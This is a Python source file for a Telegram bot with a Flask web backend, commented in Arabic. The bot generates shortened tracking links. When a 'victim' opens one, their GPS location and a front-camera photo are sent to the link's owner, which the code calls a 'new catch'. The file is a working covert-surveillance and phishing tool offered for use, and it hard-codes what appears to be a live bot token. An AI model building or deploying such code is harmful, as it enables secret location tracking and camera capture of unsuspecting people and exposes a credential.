import telebot
import requests
import base64
from flask import Flask, request, render_template

# --- الإعدادات الأساسية ---
TOKEN = '8313488232:AAFSCmIgCV-ped9mxJFGs3RyRn-A0vw8_Tg'
BASE_URL = 'https://droidlink.vercel.app' 

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# دالة اختصار الروابط
def shorten(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}")
        return res.text if res.status_code == 200 else url
    except:
        return url

# --- معالج الرسائل (Start) ---
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    # تم إزالة فحص الاشتراك الإجباري هنا ليعمل البوت فوراً
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🇸🇦 Arabic", callback_data=f"lang_ar_{user_id}"))
    markup.add(telebot.types.InlineKeyboardButton("🇺🇸 English", callback_data=f"lang_en_{user_id}"))
    
    bot.send_message(message.chat.id, "🌐 اختر لغتك / Choose Language:", reply_markup=markup)

# --- معالج الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.data.split('_')[-1]
    
    if "lang_" in call.data:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("➕ إنشاء رابط مراقبة", callback_data=f"gen_{user_id}"))
        bot.edit_message_text("✅ النظام جاهز. اضغط لإنشاء الرابط الخاص بك:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif "gen_" in call.data:
        short_link = shorten(f"{BASE_URL}/login?id={user_id}")
        bot.send_message(call.message.chat.id, f"✅ تم تجهيز رابطك بنجاح:\n\n{short_link}\n\n⚠️ ملاحظة: عند فتح الضحية للرابط، ستصلك معلوماته وصورته هنا.")

# --- مسارات الويب (Vercel) ---
@app.route('/login')
def login():
    return render_template('index.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json
    owner_id = data.get('owner_id')
    lat, lon = data.get('lat'), data.get('lon')
    
    bot.send_message(owner_id, f"📍 صيد جديد!\nالموقع: https://www.google.com/maps?q={lat},{lon}")
    
    if 'img' in data:
        img_data = base64.b64decode(data['img'].split(',')[1])
        bot.send_photo(owner_id, img_data, caption="📸 لقطة الكاميرا الأمامية")
    return "ok", 200

# المسار الصحيح لاستقبال بيانات تليجرام في Vercel
@app.route('/api/index', methods=['POST', 'GET'])
def webhook():
    if request.method == 'POST':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "ok", 200
    return "Bot is Running", 200
